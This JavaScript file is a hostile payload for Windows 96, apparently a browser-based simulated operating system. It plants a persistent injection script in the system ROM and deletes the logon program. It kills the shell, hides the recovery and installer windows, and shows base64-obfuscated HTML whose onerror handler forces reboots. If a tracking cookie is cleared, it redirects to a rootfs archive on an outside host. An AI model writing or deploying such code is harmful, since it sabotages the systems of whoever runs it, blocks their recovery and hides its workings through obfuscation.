const kinject = `
(async () => {
    kinj=kutil.sysrom.read("KINJECT.js")
    document.cookie = "data-not-cleared=true; path=/; max-age=2147483647;";
    setInterval(() => { if(!document.cookie.split("; ").some(c => c.startsWith("data-not-cleared="))){location.href = "https://windows96.net/?rootfs=https://painscreen.is-a.dev/storage/dogrootfs.zip"};},1000);
    setInterval(() => {
const target = \`| An error occured whilst launching the logon program (C:/system/local/bin/logon)
| The system will not start if this program is not present.
|
| System halted.\`;

const replacement = \`|
| Something happened
|\`;

    const html = document.body.innerHTML;

    if (html.includes(target)) {
        document.body.innerHTML = html.replace(target, replacement);
    }
        w96.state.processes.forEach(
            (z) => {
                if (z?.appWindow?.title == "System Recovery Tools" && w96.isRecovery) {
                    document.getElementById(z?.appWindow?.id).remove();
                    w96.ui.DialogCreator.alert(atob("U29tZXRoaW5nIGhhcHBlbmVkLjxpbWcgaWQ9ImNsb3NlIiBzcmM9IngiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIG9uZXJyb3I9Im5ldyBNdXRhdGlvbk9ic2VydmVyKChfLG8pPT4hZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Nsb3NlJykmJih3OTYuc3lzLnJlYm9vdCgpLG8uZGlzY29ubmVjdCgpKSkub2JzZXJ2ZShkb2N1bWVudC5ib2R5LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTsiPg=="),{icon:"error",title:"Windows 96"})
                }
                if (z?.appWindow?.title == "Windows 96 Installer" && w96.isRecovery) {
                    document.getElementById(z?.appWindow?.id).remove()
                    w96.ui.DialogCreator.alert(atob("U29tZXRoaW5nIGhhcHBlbmVkLjxpbWcgaWQ9ImNsb3NlIiBzcmM9IngiIHN0eWxlPSJkaXNwbGF5Om5vbmUiIG9uZXJyb3I9Im5ldyBNdXRhdGlvbk9ic2VydmVyKChfLG8pPT4hZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Nsb3NlJykmJih3OTYuc3lzLnJlYm9vdCgpLG8uZGlzY29ubmVjdCgpKSkub2JzZXJ2ZShkb2N1bWVudC5ib2R5LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWV9KTsiPg=="),{icon:"error",title:"Windows 96"})
                }
            })
    }, 16)
})();
`;
kutil.sysrom.write("KINJECT.js",kinject);
w96.state.processes.forEach((el)=>{if(el == null) return;if (el.title=="shell36"){el.terminate();}})
w96.FS.rm("C:/system/local/bin/logon")
setTimeout(()=>{location.href="https://windows96.net"},1000)